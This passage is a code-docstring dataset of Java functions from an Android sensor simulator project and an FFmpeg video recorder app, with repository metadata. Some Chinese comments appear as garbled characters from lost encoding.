next state in the scenario\n\t\t\t\tmModel.add(nextState);\n\t\t\t\tStateViewSmall stateView = new StateViewSmall(nextState,\n\t\t\t\t\t\tmView);\n\t\t\t\tnew StateControllerSmall(this, nextState, stateView);\n\t\t\t\tmView.addView(stateView);\n\t\t\t}\n\t\t\t// update time\n\t\t\tmScenarioTime = System.currentTimeMillis();\n\t\t}\n\t}\n\t\tbreak;\n\t}\n}", "path": "SensorSimulator\\src\\org\\openintents\\tools\\simulator\\controller\\SensorsScenarioController.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "/**\n * Creates the main panel, with a menu bar and a container panel.\n * \n * @param menubar\n * @param contentPanel\n * @param frame\n * \n * @return menu bar panel\n */\n", "func_signal": "private void fillMainPanel(JPanel menuBar, JPanel contentPanel, JFrame frame)", "code": "{\n\tcontentPanel.setLayout(new BorderLayout());\n\t// menu\n\tmenuBar.setLayout(new BoxLayout(menuBar, BoxLayout.X_AXIS));\n\n\t// sensor simulator button\n\tJButton simulatorButton = createSimulatorButton(contentPanel, frame);\n\tmenuBar.add(simulatorButton);\n\n\t// telnet simulator button\n\tJButton telnetButton = createTelnetButton(contentPanel, frame);\n\tmenuBar.add(telnetButton);\n\n\t// settings button\n\tJButton settingsButton = createSettingsButton(contentPanel, frame);\n\tmenuBar.add(Box.createHorizontalGlue());\n\tsettingsButton.setAlignmentX(Component.RIGHT_ALIGNMENT);\n\tmenuBar.add(settingsButton);\n\n\t// about button\n\tJButton aboutButton = createAboutButton();\n\taboutButton.setAlignmentX(Component.RIGHT_ALIGNMENT);\n\tmenuBar.add(aboutButton);\n}", "path": "SensorSimulator\\src\\org\\openintents\\tools\\simulator\\main\\SensorSimulatorMain.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "/**\n * It is used to control \"show Acceleration\" in the device representation.\n * \n * @param mobile\n */\n", "func_signal": "public void setMobile(final DeviceView mobile)", "code": "{\n\tAccelerometerView accView = (AccelerometerView) mSensorView;\n\taccView.getShowAcceleration().addItemListener(new ItemListener() {\n\t\t@Override\n\t\tpublic void itemStateChanged(ItemEvent e) {\n\t\t\t// Refresh the screen when this drawing element\n\t\t\t// changes\n\t\t\tmobile.doRepaint();\n\t\t}\n\t});\n}", "path": "SensorSimulator\\src\\org\\openintents\\tools\\simulator\\controller\\sensor\\AccelerometerController.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "/**\n * Main method of SensorSimulatorMain class.\n * \n * @param args\n *            , String[] arguments used to run this GUI.\n */\n", "func_signal": "public static void main(String[] args)", "code": "{\n\ttry {\n\t\t// set nimbus theme\n\t\tUIManager\n\t\t\t\t.setLookAndFeel(\"com.sun.java.swing.plaf.nimbus.NimbusLookAndFeel\");\n\n\t\t// modify some colors from the theme\n\t\tUIManager.put(\"control\", Global.BACK);\n\t\tUIManager.put(\"text\", Global.TEXT);\n\t\tUIManager.put(\"scrollbar\", Global.TEXT);\n\t\tUIManager.put(\"nimbusBlueGrey\", Global.BUTTON);\n\t\tUIManager.put(\"nimbusBase\", Global.TAB);\n\n\t} catch (ClassNotFoundException e) {\n\t\te.printStackTrace();\n\t} catch (InstantiationException e) {\n\t\te.printStackTrace();\n\t} catch (IllegalAccessException e) {\n\t\te.printStackTrace();\n\t} catch (UnsupportedLookAndFeelException e) {\n\t\te.printStackTrace();\n\t}\n\n\t// Schedule a job for the event-dispatching thread:\n\t// creating and showing this application's GUI.\n\tfinal SensorSimulatorMain mainSensorSimulator = new SensorSimulatorMain();\n\tnew Global().initGlobal();\n\tjavax.swing.SwingUtilities.invokeLater(new Runnable() {\n\t\t@Override\n\t\tpublic void run() {\n\t\t\tmainSensorSimulator.createAndShowGUI();\n\t\t}\n\t});\n}", "path": "SensorSimulator\\src\\org\\openintents\\tools\\simulator\\main\\SensorSimulatorMain.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "/**\n * Registers a listener for given sensors.\n * \n * @param listener\n *            , SensorEventListener object\n * @param sensor\n *            , Sensor object that represents sensor we want to register\n * @param rate\n *            , rate of events. This is only a hint to the system. events\n *            may be received faster or slower than the specified rate.\n *            Usually events are received faster\n * @return boolean, true or false if registering was successful or not\n */\n", "func_signal": "public boolean registerListener(SensorEventListener listener,\n\t\tSensor sensor, int rate)", "code": "{\n\tif (mClient.connected) {\n\t\tmClient.registerListener(listener, sensor, rate);\n\t\treturn true;\n\t} else {\n\t\tif (mSensorManager == null) {\n\t\t\treturn false;\n\t\t}\n\t\treturn false;\n\t}\n}", "path": "SensorSimulatorSettings\\src\\org\\openintents\\sensorsimulator\\hardware\\SensorManagerSimulator.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "// set current/stop/start states\n", "func_signal": "public void setCurrentPosition(int value)", "code": "{\n\tif (value != mPosition.getValue() && value < mStates.size()\n\t\t\t&& value > -1) {\n\t\tmPosition.setValue(value);\n\n\t\tif (mStart.getValue() > value) {\n\t\t\tmStart.setValue(value);\n\t\t}\n\t\tif (mStop.getValue() < value) {\n\t\t\tmStop.setValue(value);\n\t\t}\n\t}\n}", "path": "SensorSimulator\\src\\org\\openintents\\tools\\simulator\\model\\SensorsScenarioModel.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "/**\n * Saves last directory for an action in the configuration file.\n * @param action can be save or load\n * @param file\n */\n", "func_signal": "private void saveLastDir(String action, File file)", "code": "{\n\tStringBuffer toWriteBack = new StringBuffer();\n\tboolean found = false;\n\t// save file\n\tScanner scn;\n\ttry {\n\t\tscn = new Scanner(new File(Global.CONFIG_DIR));\n\n\t\twhile (scn.hasNext()) {\n\t\t\tString line = scn.nextLine();\n\t\t\tString[] splitedLine = line.split(\" \");\n\t\t\tif (splitedLine[0].equals(action)) {\n\t\t\t\ttoWriteBack.append(action + \" \" + file.getParent() + \"\\n\");\n\t\t\t\tfound = true;\n\t\t\t} else {\n\t\t\t\ttoWriteBack.append(line + \"\\n\");\n\t\t\t}\n\t\t}\n\t\tscn.close();\n\t} catch (FileNotFoundException e2) {\n\t\te2.printStackTrace();\n\t}\n\tif (!found) {\n\t\ttoWriteBack.append(action + \" \" + file.getAbsolutePath() + \"\\n\");\n\t}\n\n\t// overwrite file\n\tFileWriter fstream;\n\tBufferedWriter out = null;\n\ttry {\n\t\tfstream = new FileWriter(Global.CONFIG_DIR);\n\t\tout = new BufferedWriter(fstream);\n\t\tout.write(toWriteBack.toString());\n\t} catch (IOException e) {\n\t\te.printStackTrace();\n\t} finally {\n\t\ttry {\n\t\t\tout.close();\n\t\t} catch (IOException e1) {\n\t\t\te1.printStackTrace();\n\t\t}\n\n\t}\n}", "path": "SensorSimulator\\src\\org\\openintents\\tools\\simulator\\controller\\SensorsScenarioController.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "/**\n * Needs to be called when entering PLAY state from\n * SensorSimulatorController.\n * Sets the number of intermediary states in interpolation for\n * the next playback. \n */\n", "func_signal": "public void prepareToPlay()", "code": "{\n\tsetCurrentPosition(mModel.getStartPosition());\n\tfloat interpolationTime = mSensorSimulatorController\n\t\t\t.getInterpolationTime();\n\tif (interpolationTime == 0) {\n\t\tinterpolationTime = 0.1f;\n\t}\n\tmNumberOfIntermediarStates = (int) (mSensorSimulatorController\n\t\t\t.getSavingTime() / interpolationTime) - 1;\n\tif (mNumberOfIntermediarStates < 0) {\n\t\tmNumberOfIntermediarStates = 0;\n\t}\n\tmScenarioTime = System.currentTimeMillis();\n\tmScenarioInterpolatedTime = System.currentTimeMillis();\n}", "path": "SensorSimulator\\src\\org\\openintents\\tools\\simulator\\controller\\SensorsScenarioController.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "// (re)setters & getters\n", "func_signal": "public void reset()", "code": "{\n\tmStart.setValue(0);\n\tmPosition.setValue(0);\n\tmStop.setValue(0);\n}", "path": "SensorSimulator\\src\\org\\openintents\\tools\\simulator\\model\\SensorsScenarioModel.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "/**\n * \n * @return A string containing all sensors values from the current state.\n */\n", "func_signal": "public String getSensorsValues()", "code": "{\n\tStringBuffer sb = new StringBuffer();\n\tsb.append(SensorModel.ACCELEROMETER + \": \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mAccelerometer[0]) + \", \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mAccelerometer[1]) + \", \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mAccelerometer[2]) + \"\\n\");\n\tsb.append(SensorModel.MAGNETIC_FIELD + \": \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mMagneticField[0]) + \", \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mMagneticField[1]) + \", \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mMagneticField[2]) + \"\\n\");\n\tsb.append(SensorModel.ORIENTATION + \": \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mOrientation[0]) + \", \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mOrientation[1]) + \", \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mOrientation[2]) + \"\\n\");\n\tsb.append(SensorModel.TEMPERATURE + \": \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mTemperature) + \"\\n\");\n\tsb.append(SensorModel.LIGHT + \": \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mLight) + \"\\n\");\n\tsb.append(SensorModel.PROXIMITY + \": \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mProximity) + \"\\n\");\n\tsb.append(SensorModel.PRESSURE + \": \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mPressure) + \"\\n\");\n\tsb.append(SensorModel.LINEAR_ACCELERATION + \": \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mLinearAcceleration[0])\n\t\t\t+ \", \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mLinearAcceleration[1])\n\t\t\t+ \", \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mLinearAcceleration[2])\n\t\t\t+ \"\\n\");\n\tsb.append(SensorModel.GRAVITY + \": \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mGravity[0]) + \", \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mGravity[1]) + \", \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mGravity[2]) + \"\\n\");\n\n\tsb.append(SensorModel.ROTATION_VECTOR + \": \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mRotationVector[0]) + \", \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mRotationVector[1]) + \", \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mRotationVector[2]) + \"\\n\");\n\tsb.append(SensorModel.GYROSCOPE + \": \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mGyroscope[0]) + \", \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mGyroscope[1]) + \", \"\n\t\t\t+ Global.TWO_DECIMAL_FORMAT.format(mGyroscope[2]));\n\treturn sb.toString();\n}", "path": "SensorSimulator\\src\\org\\openintents\\tools\\simulator\\model\\StateModel.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "/**\n * This method starts the server for for recording sensors data \n * from real device.\n * A received message consists in sensor type and its values.\n * The received data goes to mRecordedSensors HashTable from where is read periodically.\n * \n * Note: Depending on the reading time (can be set in Settings->Saving Time),\n * a sensor may send more values before the simulator saves one. In this case, the last\n * sent value is saved.\n */\n", "func_signal": "private void startListening()", "code": "{\n\ttry {\n\t\tmServerSocket = new ServerSocket(Global.RECORDING_PORT);\n\t\tnew Thread(new Runnable() {\n\t\t\t@Override\n\t\t\tpublic void run() {\n\t\t\t\tSocket connection;\n\t\t\t\twhile (true) {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tconnection = mServerSocket.accept();\n\t\t\t\t\t\t// switch to recording view\n\t\t\t\t\t\tswitchRecord(false);\n\t\t\t\t\t\tmView.clearScenario();\n\t\t\t\t\t\tmInStream = new ObjectInputStream(connection\n\t\t\t\t\t\t\t\t.getInputStream());\n\t\t\t\t\t\twhile (true) {\n\t\t\t\t\t\t\tInteger sensorType = (Integer) mInStream\n\t\t\t\t\t\t\t\t\t.readObject();\n\t\t\t\t\t\t\tfloat[] values = (float[]) mInStream\n\t\t\t\t\t\t\t\t\t.readObject();\n\n\t\t\t\t\t\t\t// System.out.println(\"received:\" + sensorType\n\t\t\t\t\t\t\t// + \":\" + values[0] + \" \" + values[1]\n\t\t\t\t\t\t\t// + \" \" + values[2]);\n\t\t\t\t\t\t\tmRecordedSensors.put(sensorType, values);\n\t\t\t\t\t\t}\n\t\t\t\t\t} catch (IOException e) {\n\t\t\t\t\t\tSystem.out.println(\"Connection closed!\");\n\t\t\t\t\t\tswitchRecord(true);\n\t\t\t\t\t} catch (ClassNotFoundException e) {\n\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t} finally {\n\t\t\t\t\t\tcloseRecordingConnection();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}).start();\n\t} catch (IOException e) {\n\t\te.printStackTrace();\n\t}\n}", "path": "SensorSimulator\\src\\org\\openintents\\tools\\simulator\\controller\\SensorsScenarioController.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "/**\n * Create the GUI and show it. For thread safety, this method should be\n * invoked from the event-dispatching thread.\n */\n", "func_signal": "private void createAndShowGUI()", "code": "{\n\t// Create and set up the window.\n\tJFrame frame = new JFrame(\"SensorSimulator\");\n\tframe.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n\tframe.setIconImage(Toolkit.getDefaultToolkit().getImage(\n\t\t\tGlobal.ICON_SENSOR_SIMULATOR_PATH));\n\tJPanel mainPanel = new JPanel(new BorderLayout());\n\tJPanel menuBar = new JPanel();\n\tJPanel contentPanel = new JPanel();\n\tmStatusBar = new JLabel();\n\tJPanel statusPanel = new JPanel();\n\n\tfillMainPanel(menuBar, contentPanel, frame);\n\tfillStatusPanel(statusPanel, frame);\n\n\tmenuBar.setBorder(new EmptyBorder(Global.BORDER_VSIZE,\n\t\t\tGlobal.BORDER_HSIZE, Global.BORDER_VSIZE, Global.BORDER_HSIZE));\n\tmainPanel.add(menuBar, BorderLayout.NORTH);\n\tmainPanel.add(contentPanel, BorderLayout.CENTER);\n\tmainPanel.add(statusPanel, BorderLayout.SOUTH);\n\n\tmainPanel.setPreferredSize(new Dimension(Global.W_FRAME + 150,\n\t\t\tGlobal.H_FRAME));\n\t// show frame\n\tframe.add(mainPanel);\n\tframe.setVisible(true);\n\tframe.pack();\n}", "path": "SensorSimulator\\src\\org\\openintents\\tools\\simulator\\main\\SensorSimulatorMain.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "/**\n * Unregisters a listener for the sensors with which it is registered.\n * \n * @param listener\n *            , a SensorEventListener object\n * @param sensors\n *            , Sensor object that represent sensor we want to unregister\n */\n", "func_signal": "public void unregisterListener(SensorEventListener listener, Sensor sensor)", "code": "{\n\tif (mClient.connected) {\n\t\tmClient.unregisterListener(listener, sensor);\n\t}\n}", "path": "SensorSimulatorSettings\\src\\org\\openintents\\sensorsimulator\\hardware\\SensorManagerSimulator.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "/**\n * Method that checks for the 1.5 SDK Emulator bug...\n * \n * @return boolean true or false\n */\n", "func_signal": "private static boolean isRealSensorsAvailable()", "code": "{\n\tif (Build.VERSION.SDK.equals(\"3\")) {\n\t\t// We are on 1.5 SDK\n\t\tif (Build.MODEL.contains(\"sdk\")) {\n\t\t\t// We are on Emulator\n\t\t\treturn false;\n\t\t}\n\t}\n\treturn true;\n}", "path": "SensorSimulatorSettings\\src\\org\\openintents\\sensorsimulator\\hardware\\SensorManagerSimulator.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "/**\n * Saves in the StateModel format all sesnsors data (a lighter format).\n */\n", "func_signal": "public void copyState(SensorSimulatorModel simulatorModel)", "code": "{\n\tmTemperature = (float) simulatorModel.getTemperature().getReadTemp();\n\tmLight = (float) simulatorModel.getLight().getReadLight();\n\tmProximity = (float) simulatorModel.getProximity().getReadProximity();\n\tmPressure = (float) simulatorModel.getPressure().getReadPressure();\n\n\tLinearAccelerationModel linearAcceleration = simulatorModel\n\t\t\t.getLinearAcceleration();\n\tmLinearAcceleration[0] = (float) linearAcceleration\n\t\t\t.getReadLinearAccelerationX();\n\tmLinearAcceleration[1] = (float) linearAcceleration\n\t\t\t.getReadLinearAccelerationY();\n\tmLinearAcceleration[2] = (float) linearAcceleration\n\t\t\t.getReadLinearAccelerationZ();\n\n\tGravityModel gravity = simulatorModel.getGravity();\n\tmGravity[0] = (float) gravity.getReadGravityX();\n\tmGravity[1] = (float) gravity.getReadGravityY();\n\tmGravity[2] = (float) gravity.getReadGravityZ();\n\n\tOrientationModel orientation = simulatorModel.getOrientation();\n\tmOrientation[0] = (float) orientation.getReadYaw();\n\tmOrientation[1] = (float) orientation.getReadPitch();\n\tmOrientation[2] = (float) orientation.getReadRoll();\n\n\tAccelerometerModel accelerometer = simulatorModel.getAccelerometer();\n\tmAccelerometer[0] = (float) accelerometer.getReadAccelerometerX();\n\tmAccelerometer[1] = (float) accelerometer.getReadAccelerometerY();\n\tmAccelerometer[2] = (float) accelerometer.getReadAccelerometerZ();\n\n\tMagneticFieldModel magneticField = simulatorModel.getMagneticField();\n\tmMagneticField[0] = (float) magneticField.getReadCompassX();\n\tmMagneticField[1] = (float) magneticField.getReadCompassY();\n\tmMagneticField[2] = (float) magneticField.getReadCompassZ();\n\n\tRotationVectorModel rotationVector = simulatorModel.getRotationVector();\n\tmRotationVector[0] = (float) rotationVector.getReadRotationVectorX();\n\tmRotationVector[1] = (float) rotationVector.getReadRotationVectorY();\n\tmRotationVector[2] = (float) rotationVector.getReadRotationVectorZ();\n\n\tGyroscopeModel gyroscope = simulatorModel.getGyroscope();\n\tmGyroscope[0] = (float) gyroscope.getReadGyroscopePitch();\n\tmGyroscope[1] = (float) gyroscope.getReadGyroscopeYaw();\n\tmGyroscope[2] = (float) gyroscope.getReadGyroscopeRoll();\n}", "path": "SensorSimulator\\src\\org\\openintents\\tools\\simulator\\model\\StateModel.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "/**\n * This method is used in our program to make a new sensor manager simulator\n * through which we emulate our sensor input.\n * \n * @param context\n *            , Context of the activity\n * @param sensorManager\n *            , String that is used for checking in if loop\n * @return instance, instance of SensorManagerSimulator\n */\n", "func_signal": "public static SensorManagerSimulator getSystemService(Context context,\n\t\tString sensorManager)", "code": "{\n\tif (instance == null) {\n\t\tif (sensorManager.equals(Context.SENSOR_SERVICE)) {\n\t\t\tif (SensorManagerSimulator.isRealSensorsAvailable()) {\n\t\t\t\tinstance = new SensorManagerSimulator(context,\n\t\t\t\t\t\t(SensorManager) context\n\t\t\t\t\t\t\t\t.getSystemService(sensorManager));\n\t\t\t} else {\n\t\t\t\tinstance = new SensorManagerSimulator(context, null);\n\t\t\t\tToast.makeText(\n\t\t\t\t\t\tcontext,\n\t\t\t\t\t\t\"Android SensorManager disabled, 1.5 SDK emulator crashes when using it... Make sure to connect SensorSimulator\",\n\t\t\t\t\t\tToast.LENGTH_LONG).show();\n\t\t\t}\n\t\t}\n\t}\n\treturn instance;\n}", "path": "SensorSimulatorSettings\\src\\org\\openintents\\sensorsimulator\\hardware\\SensorManagerSimulator.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "/**\n * Constructor.\n * \n * If the SensorManagerSimulator is not connected, the default SensorManager\n * is used. This is obtained through (SensorManager)\n * getSystemService(Context.SENSOR_SERVICE), but can be overwritten using\n * setDefaultSensorManager().\n * \n * @param context\n *            Context of the activity.\n */\n", "func_signal": "private SensorManagerSimulator(Context context,\n\t\tSensorManager systemsensormanager)", "code": "{\n\tmContext = context;\n\tmSensorManager = systemsensormanager;\n\tmClient = new SensorSimulatorClient(mContext, this);\n}", "path": "SensorSimulatorSettings\\src\\org\\openintents\\sensorsimulator\\hardware\\SensorManagerSimulator.java", "repo_name": "openintents/sensorsimulator", "stars": 117, "license": "None", "language": "java", "size": 4088}
{"docstring": "/**\n * byte[]\u077a\u03f3\u04bbbitmap\n * \u0633480*480\u05ea90\u023a\udb4e\udf31\u6d7d\u013c\n * @param data\n */\n", "func_signal": "private void getFirstCapture(byte[] data)", "code": "{\n\t\n\tpublishProgress(10);\n\t\n\tString captureBitmapPath = CONSTANTS.CAMERA_FOLDER_PATH;\n\t\n\tcaptureBitmapPath = Util.createImagePath(FFmpegRecorderActivity.this);\n\tYuvImage localYuvImage = new YuvImage(data, 17, previewWidth,previewHeight, null);\n\tByteArrayOutputStream bos = new ByteArrayOutputStream();\n\tFileOutputStream outStream = null;\n\t\n\tpublishProgress(50);\n\t\n\ttry {\n\t\tFile file = new File(captureBitmapPath);\n\t\tif(!file.exists())\n\t\t\tfile.createNewFile();\n\t\tlocalYuvImage.compressToJpeg(new Rect(0, 0, previewWidth, previewHeight),100, bos);\n\t\tBitmap localBitmap1 = BitmapFactory.decodeByteArray(bos.toByteArray(),\n\t\t\t\t0,bos.toByteArray().length);\n\t\t\n\t\tbos.close();\n\t\t\n\t\tMatrix localMatrix = new Matrix();\n\t\tif (cameraSelection == 0)\n\t\t\tlocalMatrix.setRotate(90.0F);\n\t\telse\n\t\t\tlocalMatrix.setRotate(270.0F);\n\t\t\n\t\tBitmap\tlocalBitmap2 = Bitmap.createBitmap(localBitmap1, 0, 0,\n\t\t\t\t\t\t\tlocalBitmap1.getHeight(),\n\t\t\t\t\t\t\tlocalBitmap1.getHeight(),\n\t\t\t\t\t\t\tlocalMatrix, true);\n\t\t\n\t\tpublishProgress(70);\n\t\t\n\t\tByteArrayOutputStream bos2 = new ByteArrayOutputStream();\n\t\tlocalBitmap2.compress(Bitmap.CompressFormat.JPEG, 100, bos2);\n\t\t\t \n\t\toutStream = new FileOutputStream(captureBitmapPath);\n\t\toutStream.write(bos2.toByteArray());\n\t\toutStream.close();\n\t\t\n\t\tlocalBitmap1.recycle();\n\t\tlocalBitmap2.recycle();\n\t\t\n\t\tpublishProgress(90);\n\t\t\n\t\tisFirstFrame = false;\n\t\timagePath = captureBitmapPath;\n\t} catch (FileNotFoundException e) {\n\t\tisFirstFrame = true;\n\t\te.printStackTrace();\n\t} catch (IOException e) {\n\t\tisFirstFrame = true;\n\t\te.printStackTrace();\n\t}        \n}", "path": "src\\com\\qd\\recorder\\FFmpegRecorderActivity.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * \u05fc\u05ae\u01f0\u05fc\u036c\u00e3\u02ba\u013c\n * asyncPrepare()\n * @param path\n */\n", "func_signal": "public void prepare(String path)", "code": "{\n\ttry {\n\t\tcurrentMediaState = MediaState.PREPARE;\n\t\tmediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);\n\t\tmediaPlayer.setDataSource(path);\n\t\tmediaPlayer.setSurface(surface);\n\t\tmediaPlayer.prepare();\n\t} catch (Exception e) {\n\t}\n}", "path": "src\\com\\qd\\recorder\\VideoPlayTextureView.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * \u0631\u0377\u0524\n */\n", "func_signal": "public void stopPreview()", "code": "{\n\tif (isPreviewOn && mCamera != null) {\n\t\tisPreviewOn = false;\n\t\tmCamera.stopPreview();\n\n\t}\n}", "path": "src\\com\\qd\\recorder\\FFmpegRecorderActivity.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * \u02bc\u01b5\u013c\u04f5\n */\n", "func_signal": "public void OnDownLoadingListener()", "code": "{\n\tif (mediaStateLitenser != null)\n\t\tmediaStateLitenser.OnDownLoadingListener();\n}", "path": "src\\com\\qd\\recorder\\VideoPlayTextureView.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "//\u95ea\u52a8\u7684\u9ec4\u8272\u533a\u57df\u65f6\u95f4\u6233\n", "func_signal": "protected void onDraw(Canvas canvas)", "code": "{\n\t\tsuper.onDraw(canvas);\n\t\tlong curTime = System.currentTimeMillis();\n\t\t//Log.i(\"recorder\", curTime  - initTime + \"\");\n\t\tcountWidth = 0;\n\t\t//\u6bcf\u6b21\u7ed8\u5236\u90fd\u5c06\u961f\u5217\u4e2d\u7684\u65ad\u70b9\u7684\u65f6\u95f4\u987a\u5e8f\uff0c\u7ed8\u5236\u51fa\u6765\n\t\tif(!linkedList.isEmpty()){\n\t\t\tfloat frontTime = 0;\n\t\t\tIterator<Integer> iterator = linkedList.iterator();\n\t\t\twhile(iterator.hasNext()){\n\t\t\t\tint time = iterator.next();\n\t\t\t\t//\u6c42\u51fa\u672c\u6b21\u7ed8\u5236\u77e9\u5f62\u7684\u8d77\u70b9\u4f4d\u7f6e\n\t\t\t\tfloat left = countWidth;\n\t\t\t\t//\u6c42\u51fa\u672c\u6b21\u7ed8\u5236\u77e9\u5f62\u7684\u7ec8\u70b9\u4f4d\u7f6e\n\t\t\t\tcountWidth += (time-frontTime)*perPixel;\n\t\t\t\t//\u7ed8\u5236\u8fdb\u5ea6\u6761\n\t\t\t\tcanvas.drawRect(left, 0,countWidth,getMeasuredHeight(),progressPaint);\n\t\t\t\t//\u7ed8\u5236\u65ad\u70b9\n\t\t\t\tcanvas.drawRect(countWidth, 0,countWidth + threeWidth,getMeasuredHeight(),breakPaint);\n\t\t\t\tcountWidth += threeWidth;\n\n\t\t\t\tfrontTime = time;\n\t\t\t}\n\t\t\t//\u7ed8\u5236\u4e09\u79d2\u5904\u7684\u65ad\u70b9\n\t\t\tif(linkedList.getLast() <= 3000)\n\t\t\t\tcanvas.drawRect(perPixel*3000, 0,perPixel*3000+threeWidth,getMeasuredHeight(),threePaint);\n\t\t}else//\u7ed8\u5236\u4e09\u79d2\u5904\u7684\u65ad\u70b9\n\t\t\tcanvas.drawRect(perPixel*3000, 0,perPixel*3000+threeWidth,getMeasuredHeight(),threePaint);//\u7ed8\u5236\u4e09\u79d2\u5904\u7684\u77e9\u5f62\n\n\t\t//\u5f53\u624b\u6307\u6309\u4f4f\u5c4f\u5e55\u65f6\uff0c\u8fdb\u5ea6\u6761\u4f1a\u589e\u957f\n\t\tif(currentState == State.START){\n\t\t\tperProgress += perSecProgress*(curTime - initTime );\n\t\t\tif(countWidth + perProgress <= getMeasuredWidth())\n\t\t\t\tcanvas.drawRect(countWidth, 0,countWidth + perProgress,getMeasuredHeight(),progressPaint);\n\t\t\telse\n\t\t\t\tcanvas.drawRect(countWidth, 0,getMeasuredWidth(),getMeasuredHeight(),progressPaint);\n\t\t}\n\t\t//\u7ed8\u5236\u4e00\u95ea\u4e00\u95ea\u7684\u9ec4\u8272\u533a\u57df\uff0c\u6bcf500ms\u95ea\u52a8\u4e00\u6b21\n\t\tif(drawFlashTime==0 || curTime - drawFlashTime >= 500){\n\t\t\tisVisible = !isVisible;\n\t\t\tdrawFlashTime = System.currentTimeMillis();\n\t\t}\n\t\tif(isVisible){\n\t\t\tif(currentState == State.START)\n\t\t\t\tcanvas.drawRect(countWidth + perProgress, 0,countWidth + firstWidth + perProgress,getMeasuredHeight(),firstPaint);\n\t\t\telse\n\t\t\t\tcanvas.drawRect(countWidth, 0,countWidth + firstWidth,getMeasuredHeight(),firstPaint);\n\t\t}\n\t\t//\u7ed3\u675f\u7ed8\u5236\u4e00\u95ea\u4e00\u95ea\u7684\u9ec4\u8272\u533a\u57df\n\t\tinitTime = System.currentTimeMillis();\n\t\tinvalidate();\n\t}", "path": "src\\com\\qd\\recorder\\ProgressView.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * \u02bc\n * @param context\n */\n", "func_signal": "private void init(Context context)", "code": "{\n\tmediaPlayer = new MediaPlayer();\n\tsetSurfaceTextureListener(this);\n\tmediaPlayer.setOnCompletionListener(this);\n\tmediaPlayer.setOnPreparedListener(this);\n}", "path": "src\\com\\qd\\recorder\\VideoPlayTextureView.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
